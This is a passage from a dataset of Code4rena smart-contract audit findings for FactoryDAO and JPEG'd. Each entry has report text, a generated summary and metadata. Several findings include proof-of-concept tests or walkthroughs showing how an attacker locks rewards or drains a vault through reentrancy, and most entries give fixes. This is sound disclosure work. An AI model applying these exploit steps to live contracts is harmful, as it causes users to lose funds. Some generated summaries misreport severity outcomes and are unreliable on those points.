IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n        }\n\n        success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n        require(success, 'Token transfer failed');\n```\n\nSince line 245 of `withdrawExcessRewards()` requires that `require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');`, if one single user is unable to withdraw then it is impossible for the owner to claim the excess rewards and they are forever stuck in the contract.\n\n## Recommended Mitigation Steps\n\nConsider allowing `withdrawExcessRewards()` to be called after a set period of time after the pool end if most users have withdrawn or some similar criteria.",
      "summary": "\nThis bug report is about a vulnerability in the code of the Permissionless Basic Pool Factory. If one user becomes blacklisted or otherwise cannot be transferred funds in any of the rewards tokens or the deposit token then they will not be able to call `withdraw()` for that token. This will prevent the owner of the contract from being able to call `withdrawExcessRewards()` and therefore lock not only the users rewards and deposit but also and excess rewards attributed to the owner. This attack is very cheap as the attacker may do it with a negligible balance in their `deposit()`. To mitigate this issue, it is recommended to consider allowing `withdrawExcessRewards()` to be called after a set period of time after the pool end if most users have withdrawn or some similar criteria.",
      "quality_score": 3.6666666666666665,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/57",
      "tags": [
        "ERC20",
        "Blacklisted"
      ],
      "finders": [
        "AuditsAreUS"
      ]
    },
    {
      "id": "2241",
      "title": "[H-01] SpeedBumpPriceGate: Excess ether did not return to the user",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by 0x52, 0xYamiDancho, csanuragjain, GimelSec, gzeon, hickuphh3, horsefacts, hyh, IllIllI, kenzo, leastwood, PPrieditis, reassor, unforgiven, WatchPug, and danb_\n\nThe `passThruGate` function of the `SpeedBumpPriceGate` contract is used to charge NFT purchase fees.\nSince the price of NFT will change due to the previous purchase, users are likely to send more ether than the actual purchase price in order to ensure that they can purchase NFT. However, the passThruGate function did not return the excess ether, which would cause asset loss to the user.\nConsider the following scenario:\n\n1.  An NFT is sold for 0.15 eth\n2.  User A believes that the value of the NFT is acceptable within 0.3 eth, considering that someone may buy the NFT before him, so user A transfers 0.3 eth to buy the NFT\n3.  When user A's transaction is executed, the price of the NFT is 0.15 eth, but since the contract does not return excess eth, user A actually spends 0.3 eth.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L65-L82>\n\n\n### Recommended Mitigation Steps\n\n    -   function passThruGate(uint index, address) override external payable {\n    +  function passThruGate(uint index, address payer) override external payable {\n            uint price = getCost(index);\n            require(msg.value >= price, 'Please send more ETH');\n\n            // bump up the price\n            Gate storage gate = gates[index];\n            // multiply by the price increase factor\n            gate.lastPrice = (price * gate.priceIncreaseFactor) / gate.priceIncreaseDenominator;\n            // move up the reference\n            gate.lastPurchaseBlock = block.number;\n\n            // pass thru the ether\n            if (msg.value > 0) {\n                // use .call so we can send to contracts, for example gnosis safe, re-entrance is not a threat here\n    -           (bool sent, bytes memory data) = gate.beneficiary.call{value: msg.value}(\"\");\n    +          (bool sent, bytes memory data) = gate.beneficiary.call{value: price}(\"\");\n                require(sent, 'ETH transfer failed');\n            }\n    +      if (msg.value - price > 0){ \n    +         (bool sent, bytes memory data) = payer.call{value: msg.value - price}(\"\");\n    +          require(sent, 'ETH transfer failed');}\n        }\n\n**[illuzen (FactoryDAO) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-05-factorydao-findings/issues/48#issuecomment-1122005082)**\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/48#issuecomment-1145528979):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/4\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/48#issuecomment-1154647062):**\n > Maintaining severity as user funds are lost.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the passThruGate function of the SpeedBumpPriceGate contract which is used to charge NFT purchase fees. The vulnerability of this function is that it does not return excess ether to the user if they send more than the actual purchase price in order to ensure they can purchase an NFT. This can cause asset loss to the user. \n\nFor example, if an NFT is sold for 0.15 eth and a user believes the value of the NFT is acceptable within 0.3 eth, they would send 0.3 eth to buy the NFT. However, when their transaction is executed, the price of the NFT is 0.15 eth, but since the contract does not return excess eth, the user actually spends 0.3 eth.\n\nThe recommended mitigation step is to add code to the passThruGate function which returns the excess ether to the user. The code should be as follows:\n\n```\nif (msg.value - price > 0){ \n    (bool sent, bytes memory data) = payer.call{value: msg.value - price}(\"\");\n    require(sent, 'ETH transfer failed');}\n```\n\nThis code should be added after the existing code for the passThruGate function. This code will ensure that any excess ether is returned to the user.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/48",
      "tags": [
        "Payable",
        "Refund Ether"
      ],
      "finders": [
        "csanuragjain",
        "PPrieditis",
        "danb",
        "IllIllI",
        "0x52",
        "reassor",
        "cccz",
        "0xYamiDancho",
        "hickuphh3",
        "leastwood",
        "gzeon",
        "WatchPug",
        "unforgiven",
        "hyh",
        "horsefacts",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "22294",
      "title": "[M-05] Rewards will be locked if user transfer directly to pool without using deposit function",
      "impact": "MEDIUM",
      "content": "_Submitted by TrungOre_\n\n[LPFarming.sol#L190](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190)<br>\n\nReward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit.\n\n### Proof of Concept\n\n\"pls add this test to LpFarming.ts to check\"\n\n    it(\"a part of rewards can't be distributed if user execute a direct transfer to farm\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          const attacker = bob;\n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].transfer(attacker.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // attacker direct deposit lp token to the pool \n          await lpTokens[0].connect(attacker).transfer(farming.address, units(100));\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!\n          await mineBlocks(13);\n          console.log(\"reward of alice: \", (await   farming.pendingReward(0, alice.address)).toString());\n          expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));\n        });\n\nIn the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses `pool.lpToken.balanceOf(address(this))` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nDeclare a new variable `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1095312206):**\n > Very minor issue, severity should be 0.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1099230941):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1109827974):**\n > I'm going to downgrade this to a medium. There is a possibility for lost funds given real world external factors (user stupidity).\n\n\n\n***\n\n",
      "summary": "\nThis bug report relates to a vulnerability in the LPFarming contract, which is part of the JPEG'd project. It affects the way rewards are distributed when a user executes a direct transfer with lpToken to the farm without using the deposit function. This could lead to part of the rewards being locked in the pool when the farm ends. \n\nTo prove the concept, a test was added to the LpFarming.ts file. This test showed that if an attacker transferred 100 lpToken to the farm without using the deposit function, and Alice deposited 100 lpToken, then when the pool ended Alice would only be able to claim 500 token, with the rest being locked in the pool forever.\n\nThe recommended mitigation step for this issue is to declare a new variable called `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`. \n\nThe issue was confirmed by spaghettieth (JPEG'd), but disagreed with the severity being set as High and commented that it should be 0. The issue was then resolved and fixed in jpegd/core#2, with the severity being decreased to Medium by LSDan (judge). The reason for this was that there is a possibility for lost funds given real world external factors (user stupidity).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "22293",
      "title": "[M-04] `setDebtInterestApr` should accrue debt first",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel, also found by pedroais_\n\n[NFTVault.sol#L212](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212)<br>\n\nThe `setDebtInterestApr` changes the debt interest rate without first accruing the debt.<br>\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.\n\nIt should never be applied retroactively to a previous time window as this is unfair & wrong.<br>\nBorrowers can incur more debt than they should.\n\n### Recommended Mitigation Steps\n\nCall `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78#issuecomment-1099241122):**\n > Fixed in [jpegd/core#4](https://github.com/jpegd/core/pull/4).\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the NFTVault.sol#L212 contract. The bug was that the `setDebtInterestApr` was changing the debt interest rate without accruing the debt first, which meant that the new debt interest rate was applied retroactively to the unaccrued period on the next `accrue()` call. This could be unfair and wrong as borrowers can incur more debt than they should.\n\nThe recommended mitigation step was to call `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`. This bug was confirmed and resolved by spaghettieth (JPEG'd) and the fix was implemented in jpegd/core#4.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/78",
      "tags": [],
      "finders": []
    },
    {
      "id": "22292",
      "title": "[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock",
      "impact": "MEDIUM",
      "content": "_Submitted by TrungOre_\n\n[LPFarming.sol#L214](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214)<br>\n[LPFarming.sol#L107](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107)<br>\n\nA part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock.\n\n### Proof of Concept\n\n    it(\"a part of reward should be locked in farm if no LP join the pool at epoch.startBlock\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // skip the epoch.startBlock  \n          // it mean no one deposit lpToken to farm at this block \n          await mineBlocks(1);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          // skip the blocks to the end of epoch \n          await mineBlocks(13);\n\n          await farming.connect(alice).claim(0);\n          await mineBlocks(1);\n\n          console.log(\"reward of alice: \", (await jpeg.balanceOf(alice.address)).toString());\n          console.log(\"reward remain: \", await jpeg.balanceOf(farming.address));\n\n          // 100 jpeg will be locked in the pool forevers \n          expect(await jpeg.balanceOf(alice.address)).to.equal(900);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(100);\n        }); \n\nIn the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nAdd a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed\n\n    function claimRemainRewardsForOwner() external onlyOwner {\n            require(\n                block.number > epoch.endBlock, \n                'epoch has not ended'\n            );\n            uint256 remain = jpeg.balanceOf(address(this));\n            jpeg.safeTransfer(msg.sender, remain);\n        }\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1095301767):**\n > This is a very minor issue, severity should be 0.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1109977048):**\n > I disagree with the sponsor. Funds are lost in this scenario and it is very easy to mitigate.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the LPFarming.sol contract, which is part of the JPEG'd project. If no user deposits lpToken at the epoch.startBlock, a part of the reward tokens will be locked in the farming pool. This was demonstrated in a proof of concept written in Typescript. The bug was initially rated as having medium severity, but the sponsor disagreed and rated it as having low severity. The judge disagreed with the sponsor and rated it as having medium severity, as funds are lost in this scenario and it is easy to mitigate.\n\nTo mitigate this bug, a new function should be added to the contract which allows the admin (or user) to claim all rewards which remained in the pool when the epoch.endTime has passed. This function should require that the block number is greater than the epoch.endBlock, and would use the jpeg.safeTransfer() function to transfer the remaining rewards to the admin (or user).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/14",
      "tags": [],
      "finders": []
    },
    {
      "id": "22291",
      "title": "[H-08] `StrategyPUSDConvex.balanceOfJPEG` uses incorrect function signature while calling `extraReward.earned`, causing the function to unexpectedly revert everytime",
      "impact": "HIGH",
      "content": "_Submitted by rayn_\n\n[StrategyPUSDConvex.sol#L234](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234)<br>\n\nAs specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.\n\nThis bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.\n\n### Proof of Concept\n\nBoth `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\nBut `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned();\n                    //we found jpeg, no need to continue the loop\n                    break;\n                }\n            }\n\n            return availableBalance;\n        }\n\n### Tools Used\n\nvim, ganache-cli\n\n### Recommended Mitigation Steps\n\nPass `address(this)` as argument of `earned`.\n\nNotice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            availableBalance += baseRewardPool.earned(address(this));\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned(address(this));\n                }\n            }\n\n            return availableBalance;\n        }\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1099248200):**\n > Fixed in [jpegd/core#15](https://github.com/jpegd/core/pull/15).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1109915863):**\n > Leaving this as high risk. The issue would cause a loss of funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a bug in the StrategyPUSDConvex.sol contract which is part of the YVaultLPFarming contract. The bug is caused by the function `balanceOfJPEG` not passing any argument to the function `earned`, which will cause the entire function to revert. This bug will cause the entire farming contract to be unusable. \n\nThe bug is caused by the fact that both `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` take an address as argument, while `balanceOfJPEG` does not pass any address to `extraReward.earned`.\n\nThe recommended mitigation steps are to pass `address(this)` as argument of `earned`. This fix was confirmed and implemented by spaghettieth (JPEG'd) in the jpegd/core#15 pull request. LSDan (judge) left the bug as high risk, as it could cause a loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/139",
      "tags": [],
      "finders": []
    },
    {
      "id": "22290",
      "title": "[H-06] Setting new controller can break `YVaultLPFarming`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\n[yVaultLPFarming.sol#L170](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170)<br>\n[yVault.sol#L108](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108)<br>\n\nThe accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.\n\n```solidity\ncurrentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));\nuint256 newRewards = currentBalance - previousBalance;\n```\n\nNo funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:\n\n```solidity\nfunction setController(address _controller) public onlyOwner {\n    // @audit can reduce balanceofJpeg which breaks other masterchef contract\n    require(_controller != address(0), \"INVALID_CONTROLLER\");\n    controller = IController(_controller);\n}\n\nfunction balanceOfJPEG() external view returns (uint256) {\n    // @audit new controller could return a smaller balance\n    return controller.balanceOfJPEG(address(token));\n}\n```\n\n### Recommended Mitigation Steps\n\nSetting a new controller on a vault must be done very carefully and requires a migration.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80#issuecomment-1109891540):**\n > This is not a duplicate of H-05. Though both of them deal with issues related to balanceOfJPEG, they describe different causes.\n\n**[spaghettieth (JPEG'd) acknowledged](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the accruals in yVaultLPFarming failing if `currentBalance < previousBalance` in `_computeUpdate`. This can happen when the `vault.balanceOfJPEG()` is decreased due to calling `yVault.setController`. This means that no funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe recommended mitigation steps are to set a new controller on a vault very carefully and requires a migration. This bug report is not a duplicate of H-05, as both of them deal with issues related to balanceOfJPEG, but describe different causes. This was acknowledged by the JPEG'd team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/80",
      "tags": [],
      "finders": []
    },
    {
      "id": "22289",
      "title": "[H-05] `yVaultLPFarming`: No guarantee JPEG currentBalance > previousBalance",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3_\n\n[yVaultLPFarming.sol#L169-L170](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170)<br>\n\nyVault users participating in the farm have to trust that:\n\n*   `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies\n*   the strategy / strategies will send all claimable JPEG to the farm\n\nShould either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.\n\n### Proof of Concept\n\nFor instance,\n\n*   Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.\n\n```jsx\nit.only(\"will revert old farms' deposits and withdrawals if yVault migrates farm\", async () => {\n  // 0. setup\n  await token.mint(owner.address, units(1000));\n  await token.approve(yVault.address, units(1000));\n  await yVault.depositAll();\n  await yVault.approve(lpFarming.address, units(1000));\n  // send some JPEG to strategy prior to deposit\n  await jpeg.mint(strategy.address, units(100));\n  // deposit twice, so that the second deposit will invoke _update()\n  await lpFarming.deposit(units(250));\n  await lpFarming.deposit(units(250));\n\t\n  // 1. change farm and call withdrawJPEG()\n  await yVault.setFarmingPool(user1.address);\n  await yVault.withdrawJPEG();\n\t\n  // deposit and withdrawal will fail\n  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n});\n```\n\n*   Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded\n*   `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets\n*   A future implementation takes a fee on the `jpeg` to be claimed\n\n### Recommended Mitigation Steps\n\nA simple fix would be to `return` if `currentBalance â‰¤ previousBalance`. A full fix would properly handle potential shortfall.\n\n```jsx\nif (currentBalance <= previousBalance) return;\n```\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1096865375):**\n > The issue can be reproduced, but due to the extremely specific cases in which this happens the severity should be lowered to 2.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1099243025):**\n > Fixed in [jpegd/core#7](https://github.com/jpegd/core/pull/7).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1109877532):**\n > I disagree with the sponsor. This is high risk.\n\n\n\n***\n\n",
      "summary": "\nA bug report was submitted by hickuphh3 regarding the yVaultLPFarming.sol#L169-L170 code. The bug occurs when users of the yVault farm have to trust that the `vault.balanceOfJPEG()` returns the correct claimable JPEG amount and that the strategy/strategies will send all claimable JPEG to the farm. If either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow. The bug can be reproduced in specific cases such as farm migration, strategy migration, JPEG funds held by the old strategy not being claimed, `jpeg` being accidentally included in the StrategyConfig, or a future implementation taking a fee on the `jpeg` to be claimed. To fix the bug, a simple fix would be to `return` if `currentBalance â‰¤ previousBalance`. A full fix would properly handle potential shortfall. The severity of the bug was initially High but was later lowered to 2. The bug was fixed in jpegd/core#7.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/56",
      "tags": [],
      "finders": []
    },
    {
      "id": "22288",
      "title": "[H-04] Reentrancy issue in `yVault.deposit`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\n[yVault.sol#L144-L145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145)<br>\n\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n### Proof of Concept\n\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n*   Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n*   Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n*   Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n*   Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n*   They repeat the attack until the vault is drained.\n\n### Recommended Mitigation Steps\n\nThe `safeTransferFrom` should be the last call in `deposit`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81#issuecomment-1099250750):**\n > Fixed in [jpegd/core#19](https://github.com/jpegd/core/pull/19).\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the yVault.sol contract on lines 144-145, which could lead to exploits if the token used is one that gives control to the sender, such as ERC777 tokens. A proof of concept was provided to demonstrate how an attacker could exploit the bug to make a profit. The recommended mitigation step is to make the safeTransferFrom the last call in the deposit function. The bug was confirmed and then resolved and commented on by spaghettieth (JPEG'd). The fix was included in jpegd/core#19.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/81",
      "tags": [],
      "finders": []
    },
    {
      "id": "5344",
      "title": "[G-37] `++i` costs less gas compared to `i++` or `i += 1`",
      "impact": "GAS",
